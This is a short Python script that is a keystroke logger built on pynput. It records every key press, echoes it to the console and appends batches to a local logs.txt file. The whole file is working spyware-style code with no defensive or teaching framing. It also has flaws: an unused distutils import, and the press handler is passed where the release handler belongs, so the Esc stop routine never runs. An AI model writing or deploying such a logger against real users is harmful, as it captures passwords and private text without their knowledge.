from distutils.command.install_egg_info import to_filename
import pynput

from pynput.keyboard import Key, Listener
count =0 
keys=[]

def on_press(key):
    global keys,count
    count +=1
    keys.append(key)
    print ("{0} pressed".format(key))
    
    if count>=10:
        count=0
        write_on_file(keys)
        keys=[]
 


def write_on_file(keys):
    with open("logs.txt",'a') as IN:
       for chr in keys: 
         k= str(chr).replace("'","")
         if k.find("space") > 0:
            IN.write('\n')
         elif k.find("Key") == - 1:
            IN.write(str(k))


def on_release (key):
    if key== key.esc:
        return False

with Listener(on_press=on_press, on_release=on_press) as Listener:
    Listener.join()



